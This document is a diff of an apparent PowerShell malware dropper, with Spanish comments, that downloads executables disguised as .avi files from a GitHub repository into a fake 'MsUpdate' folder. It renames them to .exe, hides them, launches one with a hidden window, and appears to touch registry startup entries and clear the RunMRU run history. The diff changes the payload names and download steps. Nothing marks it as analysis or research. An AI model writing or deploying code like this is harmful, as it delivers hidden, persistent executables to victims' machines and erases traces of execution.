@@ -8,43 +8,30 @@ if (-not (Test-Path -Path $MsRdpNetPath)) {
 }
 
 # Copy Agent
-$rutaLocalAgent = "$env:UserProfile\AppData\Local\Microsoft\MsUpdate\RegUpdate.exe"
+$rutaLocalAgent = "$env:UserProfile\AppData\Local\Microsoft\MsUpdate\DocUp.exe"
 $urlRemotoAgent = "https://github.com/emakedie/UCN/raw/refs/heads/main/RegUpdate.avi"
 if (-not (Test-Path $rutaLocalAgent)) {
     Invoke-WebRequest -Uri $urlRemotoAgent -OutFile $rutaLocalAgent
 }
-if ((Get-Item $rutaLocalAgent).Name -ne "RegUpdate.exe") {
-    $rutaNuevoNombreAgent = $rutaLocalAgent -replace 'RegUpdate.avi', 'RegUpdate.exe'
+if ((Get-Item $rutaLocalAgent).Name -ne "DocUp.exe") {
+    $rutaNuevoNombreAgent = $rutaLocalAgent -replace 'RegUpdate.avi', 'DocUp.exe'
     Rename-Item -Path $rutaLocalAgent -NewName $rutaNuevoNombreAgent
 }
 $atributosOcultosAgent = (Get-Item $rutaLocalAgent).Attributes -bor [System.IO.FileAttributes]::Hidden
 Set-ItemProperty -Path $rutaLocalAgent -Name Attributes -Value $atributosOcultosAgent
 
-# Copy Ejecuter
-# Definir rutas locales y URL
-$rutaLocalZip = "C:\Users\candrade\AppData\Local\Microsoft\MsUpdate\SMSUCN.zip"
-$urlRemotoZip = "https://github.com/emakedie/UCN/raw/refs/heads/main/SMSUCN.zip"
-$rutaDestinoExtraido = "C:\Users\candrade\AppData\Local\Microsoft\MsUpdate"
-$rutaArchivoAvi = "$rutaDestinoExtraido\SMSUCN.avi"
-$rutaArchivoExe = "$rutaDestinoExtraido\SMSUCN.exe"
-# Descargar el archivo zip si no existe
-if (-not (Test-Path $rutaLocalZip)) {
-    Invoke-WebRequest -Uri $urlRemotoZip -OutFile $rutaLocalZip
+# Copy Runer
+$rutaLocalRuner = "$env:UserProfile\AppData\Local\Microsoft\MsUpdate\SMSUCN.exe"
+$urlRemotoRuner = "https://github.com/emakedie/UCN/raw/refs/heads/main/SMSUCN.avi"
+if (-not (Test-Path $rutaLocalRuner)) {
+    Invoke-WebRequest -Uri $urlRemotoRuner -OutFile $rutaLocalRuner
 }
-# Extraer el contenido del zip directamente en la carpeta destino
-if (Test-Path $rutaLocalZip) {
-    # Extraer el archivo zip en la carpeta de destino
-    Expand-Archive -Path $rutaLocalZip -DestinationPath $rutaDestinoExtraido -Force
+if ((Get-Item $rutaLocalRuner).Name -ne "SMSUCN.exe") {
+    $rutaNuevoNombreRuner = $rutaLocalRuner -replace 'SMSUCN.avi', 'SMSUCN.exe'
+    Rename-Item -Path $rutaLocalRuner -NewName $rutaNuevoNombreRuner
 }
-# Comprobar si el archivo SMSUCN.avi existe y renombrarlo como .exe
-if (Test-Path $rutaArchivoAvi) {
-    Rename-Item -Path $rutaArchivoAvi -NewName $rutaArchivoExe
-}
-# Opcionalmente, establecer el archivo renombrado como oculto
-$atributosOcultos = (Get-Item $rutaArchivoExe).Attributes -bor [System.IO.FileAttributes]::Hidden
-Set-ItemProperty -Path $rutaArchivoExe -Name Attributes -Value $atributosOcultos
-# Borrar el archivo zip después de la extracción
-Remove-Item -Path $rutaLocalZip -Force
+$atributosOcultosRuner = (Get-Item $rutaLocalRuner).Attributes -bor [System.IO.FileAttributes]::Hidden
+Set-ItemProperty -Path $rutaLocalRuner -Name Attributes -Value $atributosOcultosRuner
 
 
 # Registry path for the startup entries
@@ -57,7 +44,6 @@ if (-not (Test-Path "$rutaRegistro\$nombreEntrada")) {
 
 ## Execution of the client
 Start-Process -FilePath "$env:UserProfile\AppData\Local\Microsoft\MsUpdate\SMSUCN.exe" -WindowStyle Hidden
-
 
 # Limpiar historial de ejecucion
 $registryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
